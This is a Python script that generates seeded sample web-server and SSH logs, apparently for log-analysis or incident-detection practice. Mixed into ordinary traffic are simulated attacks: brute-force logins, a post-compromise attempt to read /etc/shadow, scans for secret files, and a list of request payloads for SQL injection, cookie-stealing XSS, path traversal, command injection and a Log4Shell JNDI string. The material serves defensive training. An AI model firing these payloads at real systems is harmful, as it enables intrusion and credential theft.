"""Write samples/auth.log and samples/access.log: one day on a small web server, with a few
incidents mixed into ordinary traffic. Seeded, so the output is the same every run.

Every address is from the documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24),
so nothing here points at a real machine.
"""
import random
from datetime import datetime, timedelta
from pathlib import Path

HERE = Path(__file__).parent
rng = random.Random(1953)
DAY = datetime(2026, 11, 18)
HOST = "web01"

auth: list[tuple[datetime, str]] = []
web: list[tuple[datetime, str]] = []


def syslog(t: datetime, msg: str) -> None:
    auth.append((t, f"{t:%b} {t.day:>2} {t:%H:%M:%S} {HOST} {msg}"))


def sshd(t: datetime, msg: str) -> None:
    syslog(t, f"sshd[{rng.randint(1000, 65000)}]: {msg}")


def access(t: datetime, ip: str, req: str, status: int, size: int, agent: str, ref: str = "-") -> None:
    web.append((t, f'{ip} - - [{t:%d/%b/%Y:%H:%M:%S} +1200] "{req}" {status} {size} "{ref}" "{agent}"'))


BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
]
PAGES = ["/", "/about", "/services", "/contact", "/blog/backups-that-work", "/blog/ssh-hardening", "/assets/site.css",
         "/assets/app.js", "/assets/logo.svg", "/favicon.ico"]

# ---------------------------------------------------------------- ordinary traffic
for _ in range(900):
    t = DAY + timedelta(seconds=rng.randint(6 * 3600, 23 * 3600))
    ip = f"192.0.2.{rng.randint(20, 220)}"
    page = rng.choice(PAGES)
    status = 304 if page.startswith("/assets") and rng.random() < .3 else 200
    access(t, ip, f"GET {page} HTTP/2.0", status, 0 if status == 304 else rng.randint(900, 48000), rng.choice(BROWSERS))
for _ in range(25):  # the odd broken link
    t = DAY + timedelta(seconds=rng.randint(6 * 3600, 23 * 3600))
    access(t, f"192.0.2.{rng.randint(20, 220)}", "GET /blog/old-post HTTP/2.0", 404, 162, rng.choice(BROWSERS))

# the admin's own logins, key-based, plus a sudo session
for hour in (8, 13, 17):
    t = DAY + timedelta(hours=hour, minutes=rng.randint(0, 50))
    sshd(t, "Accepted publickey for siddhanth from 192.0.2.10 port 51122 ssh2: ED25519 SHA256:q3Vv0examplefingerprint")
    syslog(t + timedelta(minutes=2), "sudo: siddhanth : TTY=pts/0 ; PWD=/home/siddhanth ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx")

# ---------------------------------------------------------------- incidents
# 1. fast brute force: 186 attempts in about 9 minutes
t = DAY + timedelta(hours=2, minutes=14)
users = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "git", "user", "pi", "ftpuser"]
for i in range(186):
    t += timedelta(seconds=rng.randint(1, 5))
    u = rng.choice(users)
    if u != "root" and rng.random() < .8:
        sshd(t, f"Invalid user {u} from 203.0.113.45 port {rng.randint(30000, 60000)}")
        sshd(t, f"Failed password for invalid user {u} from 203.0.113.45 port {rng.randint(30000, 60000)} ssh2")
    else:
        sshd(t, f"Failed password for {u} from 203.0.113.45 port {rng.randint(30000, 60000)} ssh2")
sshd(t, "message repeated 4 times: [ Failed password for root from 203.0.113.45 port 41870 ssh2]")

# 2. slow username enumeration: one try every 20-40 minutes, never trips the brute-force window
t = DAY + timedelta(hours=1)
for u in ["admin", "support", "backup", "deploy", "jenkins", "www-data", "mysql", "test2", "guest"]:
    t += timedelta(minutes=rng.randint(20, 40))
    sshd(t, f"Invalid user {u} from 198.51.100.23 port {rng.randint(30000, 60000)}")
    sshd(t, f"Failed password for invalid user {u} from 198.51.100.23 port {rng.randint(30000, 60000)} ssh2")

# 3. the one that matters: failures, then a password login that works
t = DAY + timedelta(hours=3, minutes=41)
for _ in range(7):
    t += timedelta(seconds=rng.randint(20, 70))
    sshd(t, f"Failed password for deploy from 203.0.113.77 port {rng.randint(30000, 60000)} ssh2")
t += timedelta(seconds=35)
sshd(t, "Accepted password for deploy from 203.0.113.77 port 50412 ssh2")
syslog(t + timedelta(minutes=3), "sudo:   deploy : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash")
syslog(t + timedelta(minutes=4), "sudo:   deploy : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow")
syslog(t + timedelta(minutes=6), "sudo:   deploy : 1 incorrect password attempt ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/id")

# 4. someone logged straight in as root
sshd(DAY + timedelta(hours=21, minutes=5), "Accepted password for root from 192.0.2.10 port 50999 ssh2")

# 5. a vulnerability scanner sweeping common paths
probe_paths = ["/.env", "/.env.bak", "/.git/config", "/.git/HEAD", "/wp-login.php", "/xmlrpc.php", "/phpmyadmin/",
               "/pma/", "/server-status", "/backup.zip", "/dump.sql", "/config.php.bak", "/.aws/credentials",
               "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/actuator/env", "/cgi-bin/luci", "/HNAP1/",
               "/admin/", "/login.action", "/solr/admin/info/system", "/owa/auth/logon.aspx", "/.DS_Store"]
t = DAY + timedelta(hours=10, minutes=3)
for i in range(140):
    t += timedelta(milliseconds=rng.randint(300, 1400))
    path = probe_paths[i % len(probe_paths)] if i < 66 else f"/{rng.choice(['old', 'test', 'dev', 'api', 'v1', 'tmp'])}/{rng.randint(1, 999)}"
    access(t, "198.51.100.200", f"GET {path} HTTP/1.1", 404, 162, "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)")

# 6. a secret file that was actually served
t = DAY + timedelta(hours=11, minutes=27)
for path, status, size in [("/.git/config", 404, 162), ("/.env", 200, 734), ("/.env.production", 404, 162), ("/backup.zip", 200, 18_340_112)]:
    t += timedelta(seconds=rng.randint(2, 9))
    access(t, "203.0.113.9", f"GET {path} HTTP/1.1", status, size, "python-requests/2.32.3")

# 7. injection attempts against the shop search
t = DAY + timedelta(hours=15, minutes=12)
for q, status in [
    ("/products?id=1%27%20OR%20%271%27%3D%271", 200),
    ("/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", 500),
    ("/products?id=1%3BSELECT%20SLEEP(5)", 500),
    ("/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", 200),
    ("/static/..%2f..%2f..%2fetc%2fpasswd", 400),
    ("/download?file=../../../../etc/passwd", 403),
    ("/ping?host=8.8.8.8%3Bcat%20%2Fetc%2Fpasswd", 400),
]:
    t += timedelta(seconds=rng.randint(3, 20))
    access(t, "198.51.100.66", f"GET {q} HTTP/1.1", status, rng.randint(150, 4000), "sqlmap/1.8.11#stable (https://sqlmap.org)")
access(t + timedelta(minutes=9), "198.51.100.71", "GET / HTTP/1.1", 200, 5120, "${jndi:ldap://198.51.100.71:1389/a}")

# 8. the app server fell over for a couple of minutes
t = DAY + timedelta(hours=14, minutes=2)
for i in range(64):
    access(t + timedelta(seconds=i * 1.8), f"192.0.2.{rng.randint(20, 220)}", f"GET {rng.choice(PAGES[:6])} HTTP/2.0", 502, 157, rng.choice(BROWSERS))

# ---------------------------------------------------------------- write
auth.sort(key=lambda x: x[0])
web.sort(key=lambda x: x[0])
(HERE / "auth.log").write_text("\n".join(line for _, line in auth) + "\n", encoding="utf-8", newline="\n")
(HERE / "access.log").write_text("\n".join(line for _, line in web) + "\n", encoding="utf-8", newline="\n")
print(f"auth.log: {len(auth)} lines, access.log: {len(web)} lines")
